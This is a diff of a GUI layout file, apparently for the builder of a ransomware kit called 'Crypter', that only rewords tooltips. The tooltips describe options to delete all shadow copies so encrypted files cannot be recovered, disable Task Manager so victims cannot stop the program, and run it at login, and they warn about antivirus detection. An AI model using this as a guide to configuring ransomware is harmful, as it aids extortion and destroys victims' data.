@@ -3117,7 +3117,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, the GUI will be launched each time the user logs in</property>
+                                                                                        <property name="tooltip">If ticked, the GUI will be launched each time the user logs in.&#x0A;&#x0A;Warning: Enabling this option may significantly increase the rate of Anti-Virus detection</property>
                                                                                         <property name="window_extra_style"></property>
                                                                                         <property name="window_name"></property>
                                                                                         <property name="window_style"></property>
@@ -3211,7 +3211,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, the GUI will be launched each time the user logs in</property>
+                                                                                        <property name="tooltip">If ticked, the GUI will be launched each time the user logs in.&#x0A;&#x0A;Warning: Enabling this option may significantly increase the rate of Anti-Virus detection</property>
                                                                                         <property name="validator_data_type"></property>
                                                                                         <property name="validator_style">wxFILTER_NONE</property>
                                                                                         <property name="validator_type">wxDefaultValidator</property>
@@ -3341,7 +3341,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine&apos;s files and can be used to gain access to the encrypted data without the decryption key.&#x0A;&#x0A;Note: This operation will fail silently if the user does not have sufficient privileges</property>
+                                                                                        <property name="tooltip">If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine&apos;s files and can be used to gain access to the encrypted data without the decryption key.&#x0A;&#x0A;Warning: This operation will fail silently if the user does not have sufficient privileges</property>
                                                                                         <property name="window_extra_style"></property>
                                                                                         <property name="window_name"></property>
                                                                                         <property name="window_style"></property>
@@ -3435,7 +3435,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine&apos;s files and can be used to gain access to the encrypted data without the decryption key.&#x0A;&#x0A;Note: This operation will fail silently if the user does not have sufficient privileges</property>
+                                                                                        <property name="tooltip">If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine&apos;s files and can be used to gain access to the encrypted data without the decryption key.&#x0A;&#x0A;Warning: This operation will fail silently if the user does not have sufficient privileges</property>
                                                                                         <property name="validator_data_type"></property>
                                                                                         <property name="validator_style">wxFILTER_NONE</property>
                                                                                         <property name="validator_type">wxDefaultValidator</property>
@@ -3533,7 +3533,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, Windows Task Manager will be disabled when Crypter is opened.&#x0A;&#x0A;Note: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection</property>
+                                                                                        <property name="tooltip">If ticked, Windows Task Manager will be disabled when Crypter is opened.&#x0A;&#x0A;Warning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection</property>
                                                                                         <property name="window_extra_style"></property>
                                                                                         <property name="window_name"></property>
                                                                                         <property name="window_style"></property>
@@ -3627,7 +3627,7 @@
                                                                                         <property name="style"></property>
                                                                                         <property name="subclass"></property>
                                                                                         <property name="toolbar_pane">0</property>
-                                                                                        <property name="tooltip">If ticked, Windows Task Manager will be disabled when Crypter is opened.&#x0A;&#x0A;Note: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection</property>
+                                                                                        <property name="tooltip">If ticked, Windows Task Manager will be disabled when Crypter is opened.&#x0A;&#x0A;Warning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection</property>
                                                                                         <property name="validator_data_type"></property>
                                                                                         <property name="validator_style">wxFILTER_NONE</property>
                                                                                         <property name="validator_type">wxDefaultValidator</property>
